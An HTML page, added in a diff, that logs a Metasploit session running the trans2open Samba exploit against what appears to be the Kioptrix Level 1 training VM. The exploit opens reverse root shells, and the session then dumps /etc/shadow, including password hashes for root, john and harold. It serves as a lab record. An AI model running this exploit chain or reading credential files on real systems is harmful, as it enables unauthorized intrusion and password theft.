@@ -1,0 +1,89 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Metasploit: trans2open</title>
+</head><body>msf6 exploit(linux/samba/trans2open) &gt; options<br/>
+<br/>
+Module options (exploit/linux/samba/trans2open):<br/>
+<br/>
+&nbsp; &nbsp;Name &nbsp; &nbsp;Current Setting &nbsp;Required &nbsp;Description<br/>
+&nbsp; &nbsp;---- &nbsp; &nbsp;--------------- &nbsp;-------- &nbsp;-----------<br/>
+&nbsp; &nbsp;RHOSTS &nbsp;192.168.248.129 &nbsp;yes &nbsp; &nbsp; &nbsp; The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /using-metasploit.html<br/>
+&nbsp; &nbsp;RPORT &nbsp; 139 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; The target port (TCP)<br/>
+<br/>
+<br/>
+<b>Payload options (linux/x86/shell_reverse_tcp):</b><br/>
+<br/>
+&nbsp; &nbsp;Name &nbsp; Current Setting &nbsp;Required &nbsp;Description<br/>
+&nbsp; &nbsp;---- &nbsp; --------------- &nbsp;-------- &nbsp;-----------<br/>
+&nbsp; &nbsp;CMD &nbsp; &nbsp;/bin/sh &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; The command string to execute<br/>
+&nbsp; &nbsp;LHOST &nbsp;172.20.72.111 &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; The listen address (an interface may be specified)<br/>
+&nbsp; &nbsp;LPORT &nbsp;4444 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; The listen port<br/>
+<br/>
+<br/>
+Exploit target:<br/>
+<br/>
+&nbsp; &nbsp;Id &nbsp;Name<br/>
+&nbsp; &nbsp;-- &nbsp;----<br/>
+&nbsp; &nbsp;0 &nbsp; Samba 2.2.x - Bruteforce<br/>
+<br/>
+<br/>
+<br/>
+View the full module info with the info, or info -d command.<br/>
+<br/>
+msf6 exploit(linux/samba/trans2open) &gt; run<br/>
+<br/>
+[*] Started reverse TCP handler on 172.20.72.111:4444<br/>
+[*] 192.168.248.129:139 - Trying return address 0xbffffdfc...<br/>
+[*] 192.168.248.129:139 - Trying return address 0xbffffcfc...<br/>
+[*] 192.168.248.129:139 - Trying return address 0xbffffbfc...<br/>
+[*] 192.168.248.129:139 - Trying return address 0xbffffafc...<br/>
+[*] 192.168.248.129:139 - Trying return address 0xbffff9fc...<br/>
+[*] 192.168.248.129:139 - Trying return address 0xbffff8fc...<br/>
+[*] 192.168.248.129:139 - Trying return address 0xbffff7fc...<br/>
+[*] 192.168.248.129:139 - Trying return address 0xbffff6fc...<br/>
+[*] Command shell session 5 opened (172.20.72.111:4444 -&gt; 172.20.64.1:34242) at 2024-02-26 13:11:38 +0700<br/>
+<br/>
+[*] Command shell session 6 opened (172.20.72.111:4444 -&gt; 172.20.64.1:34243) at 2024-02-26 13:11:39 +0700<br/>
+[*] Command shell session 7 opened (172.20.72.111:4444 -&gt; 172.20.64.1:34244) at 2024-02-26 13:11:40 +0700<br/>
+[*] Command shell session 8 opened (172.20.72.111:4444 -&gt; 172.20.64.1:34245) at 2024-02-26 13:11:41 +0700<br/>
+<br/>
+whoami<br/>
+root<br/>
+hostname<br/>
+kioptrix.level1<br/>
+<br/>
+<b>cat /etc/shadow</b><br/>
+<b>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::</b><br/>
+bin:*:14513:0:99999:7:::<br/>
+daemon:*:14513:0:99999:7:::<br/>
+adm:*:14513:0:99999:7:::<br/>
+lp:*:14513:0:99999:7:::<br/>
+sync:*:14513:0:99999:7:::<br/>
+shutdown:*:14513:0:99999:7:::<br/>
+halt:*:14513:0:99999:7:::<br/>
+mail:*:14513:0:99999:7:::<br/>
+news:*:14513:0:99999:7:::<br/>
+uucp:*:14513:0:99999:7:::<br/>
+operator:*:14513:0:99999:7:::<br/>
+games:*:14513:0:99999:7:::<br/>
+gopher:*:14513:0:99999:7:::<br/>
+ftp:*:14513:0:99999:7:::<br/>
+nobody:*:14513:0:99999:7:::<br/>
+mailnull:!!:14513:0:99999:7:::<br/>
+rpm:!!:14513:0:99999:7:::<br/>
+xfs:!!:14513:0:99999:7:::<br/>
+rpc:!!:14513:0:99999:7:::<br/>
+rpcuser:!!:14513:0:99999:7:::<br/>
+nfsnobody:!!:14513:0:99999:7:::<br/>
+nscd:!!:14513:0:99999:7:::<br/>
+ident:!!:14513:0:99999:7:::<br/>
+radvd:!!:14513:0:99999:7:::<br/>
+postgres:!!:14513:0:99999:7:::<br/>
+apache:!!:14513:0:99999:7:::<br/>
+squid:!!:14513:0:99999:7:::<br/>
+pcap:!!:14513:0:99999:7:::<br/>
+<b>john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::<br/>
+harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::</b></body></html>
